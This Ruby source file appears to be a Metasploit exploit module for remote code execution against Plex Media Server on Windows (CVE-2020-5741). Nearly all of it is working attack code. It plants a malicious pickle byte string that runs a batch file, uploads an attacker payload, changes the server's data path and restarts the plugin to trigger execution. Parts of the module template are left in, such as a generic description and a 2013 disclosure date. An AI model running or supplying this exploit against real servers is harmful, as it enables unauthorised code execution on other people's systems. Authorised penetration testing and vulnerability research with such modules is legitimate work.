##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        # The Name should be just like the line of a Git commit - software name,
        # vuln type, class. Preferably apply
        # some search optimization so people can actually find the module.
        # We encourage consistency between module name and file name.
        'Name'           => 'Plex Unpickle Windows RCE',
        'Description'    => %q(
            This exploit module illustrates how a vulnerability could be exploited
          in a webapp.
        ),
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'h00die', # msf module
            'Chris Lyne' # discovery, POC
          ],
        'References'     =>
          [
            [ 'URL', 'https://github.com/tenable/poc/blob/master/plex/plex_media_server/auth_dict_unpickle_rce_exploit_tra_2020_32.py'],
            [ 'URL', 'https://www.tenable.com/security/research/tra-2020-32'],
            [ 'CVE', '2020-5741']
          ],
        # platform refers to the type of platform.  For webapps, this is typically the language of the webapp.
        # js, php, python, nodejs are common, this will effect what payloads can be matched for the exploit.
        # A full list is available in lib/msf/core/payload/uuid.rb
        'Platform'       => ['windows'],
        # from lib/msf/core/module/privileged, denotes if this requires or gives privileged access
        'Privileged'     => false,
        # from underlying architecture of the system.  typically ARCH_X64 or ARCH_X86, but for webapps typically
        # this is the application language. ARCH_PYTHON, ARCH_PHP, ARCH_JAVA are some examples
        # A full list is available in lib/msf/core/payload/uuid.rb
        'Arch'           => ARCH_CMD,
        'Targets'        =>
          [
            [ 'Automatic Target', {}]
          ],
        'DisclosureDate' => "Apr 1 2013",
        # Note that DefaultTarget refers to the index of an item in Targets, rather than name.
        # It's generally easiest just to put the default at the beginning of the list and skip this
        # entirely.
        'DefaultTarget'  => 0
      )
    )
    # set the default port, and a URI that a user can set if the app isn't installed to the root
    register_options(
      [
        Opt::RPORT(32400),
        OptString.new('PLEX_TOKEN', [ true, 'Admin Authenticated X-Plex-Token', '']),
        OptString.new('LIBRARY_PATH', [ true, 'Path to write picture library to', 'C:\\Users\\Public']),
        OptString.new('ALBUM_NAME', [ true, 'Name of Album', 'mememe'])
      ]
    )
  end

  def album_name
    if @album_name.nil?
      @album_name = datastore['ALBUM_NAME'].blank? ? rand_text_alphanumeric(6..12) : datastore['ALBUM_NAME']
    end
    @album_name
  end

  def create_photo_library
    print_status('Adding new photo library')
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => '/library/sections',
      'headers' =>
        {
          'X-Plex-Token'=> datastore['PLEX_TOKEN'],
          'Accept' => 'application/json'
        },
      'vars_get' => 
        {
          'name'=>album_name, #rand_text_alphanumeric(6..12),
          'language'=>'en',
          'agent'=>'com.plexapp.agents.none',
          'location'=> datastore['LIBRARY_PATH'],
          'type'=>'photo',
          'scanner'=>'Plex Photo Scanner'
        }
    )
    # response:
    # {"MediaContainer":{"size":1,"Directory":[{"art":"/:/resources/photo-fanart.jpg","composite":"/library/sections/-1/composite/1592441414","thumb":"/:/resources/photo.png","key":"7","type":"photo","title":"EvilLib2","agent":"com.plexapp.agents.none","scanner":"Plex Photo Scanner","language":"en","uuid":"95d3810f-8be0-497c-b6d4-170050f7ab30","updatedAt":1592441414,"createdAt":1592441414,"enableAutoPhotoTags":false,"content":true,"directory":true,"contentChangedAt":5135637678740750690,"Location":[{"id":7,"path":"C:\\Users\\Public"}]}]}}
    # we need to pull ['MediaContainer']['Directory']['key']
    if res && res.code == 201 # 201 == Created
      return res.get_json_document['MediaContainer']['Directory'][0]['key']
    end
    nil
  end

  def add_pickle(location)
    print_status('Adding evil Dict to library')
    # os.system('PATH\\Dict.bat') from python pickle
    p = "\x80\x02cnt\nsystem\nq\x00U\x1fc:\\Users\\Public\\mememe\\Dict.batq\x01\x85q\x02Rq\x03."
    filename = "#{album_name}/Plex Media Server/Plug-in Support/Data/com.plexapp.system/"

    #p.gsub!('PATH', "#{datastore['LIBRARY_PATH']}\\#{filename}")
    #p.gsub!('/','\\')

    File.open('/tmp/msf.pickle', 'w') {|file| file.write(p)}
    u = "type=13&sectionID=3&locationID=#{location}&createdAt=1171387901&filename=#{URI.encode_www_form_component(filename)}"
    # using raw here because the encodings for the filename got really wacky when using CGI
    send_request_raw(
      'method' => 'POST',
      'uri' => "/library/metadata?#{u}Dict",
      'headers' => {'X-Plex-Token'=> datastore['PLEX_TOKEN']},
      'ctype' => 'application/octet-stream',
      'data' => p
    )
    filename = "#{album_name}/"
    u = "type=13&sectionID=3&locationID=#{location}&createdAt=1171387901&filename=#{URI.encode_www_form_component(filename)}"
    send_request_raw(
      'method' => 'POST',
      'uri' => "/library/metadata?#{u}Dict.bat", # Dict-1
      'headers' => {'X-Plex-Token'=> datastore['PLEX_TOKEN']},
      'ctype' => 'application/octet-stream',
      'data' => payload.encoded
    )

  end

  def change_apppath(path) 
    print_status('Changing AppPath')
    send_request_cgi(
      'method' => 'PUT',  
      'uri' => '/:/prefs',
      'vars_get' =>
        {
          'X-Plex-Token'=> datastore['PLEX_TOKEN'],
          'LocalAppDataPath'=>path,#'C\x\Users\Public\myalbum',
        },
    )
  end

  def restart_plex
    print_status('Restarting Plex')
    send_request_cgi(
      'method' => 'GET',
      'uri' => '/:/plugins/com.plexapp.system/restart',
      'vars_get' =>
        {
          'X-Plex-Token'=> datastore['PLEX_TOKEN'],
        },
    )
  end

  def delete_photo_library(library)
    print_status('Deleting Photo Library')
    send_request_cgi(
      'method' => 'DELETE',
      'uri' => "/library/sections/#{library}",
      'vars_get' =>
        {
          'X-Plex-Token'=> datastore['PLEX_TOKEN'],
        },
    )
  end

  def get_server_info
    print_status('Gathering Plex Config')
    res = send_request_cgi(
      'uri' => '/',
      'headers' => {'X-Plex-Token'=> datastore['PLEX_TOKEN']},
    )
    unless res && res.code == 200
      return nil
    end
    return Hash.from_xml(res.body)
  end

  def check
    server = get_server_info
    if server.nil?
      return CheckCode::Safe('Could not connect to the web service, check URI Path and IP')
    end

    store_loot('plex.json', 'application/json', datastore['RHOST'], server.to_s, 'plex.json', 'Plex Server Configuration')

    report_host({
         :host => datastore['RHOST'],
         :os_name => server['MediaContainer']['platform'],
         :os_flavor => server['MediaContainer']['platformVersion']
        })
    print_status("Server Name: #{server['MediaContainer']['friendlyName']}")   
    print_status("Server Owner: #{server['MediaContainer']['myPlexUsername']}")
    unless server['MediaContainer']['platform'] == 'Windows'
      print_bad("Server OS: #{server['MediaContainer']['platform']} (#{server['MediaContainer']['platformVersion']})")
      return CheckCode::Safe('Only Windows OS is exploitable')
    end
    print_good("Server OS: #{server['MediaContainer']['platform']} (#{server['MediaContainer']['platformVersion']})")
    v = Gem::Version.new(server['MediaContainer']['version'])
    if v >= Gem::Version.new('1.19.3')
      print_bad("Server Version: #{v}")
      return CheckCode::Safe("Only < 1.19.3 is exploitable")
    end
    print_good("Server Version: #{server['MediaContainer']['version']}")
    CheckCode::Vulnerable
  end

  def exploit
    unless check == CheckCode::Vulnerable
      fail_with(Failure::NotVulnerable,'Server not vulnerable')
    end

    id = create_photo_library
    if id.nil?
      fail_with(Failure::UnexpectedReply,'Unable to create photo library, possible permission problem')    
    end
    print_good("Created Photo Library: #{id}")
    add_pickle(id)
    change_apppath("#{datastore['LIBRARY_PATH']}\\#{album_name}")
    Rex::sleep(20)
    restart_plex
    print_status('Sleeping 15 seconds for server restart')
    Rex::sleep(15)
    print_status('Reverting changes')
    change_apppath('')
    restart_plex
    delete_photo_library(id)

  end
end
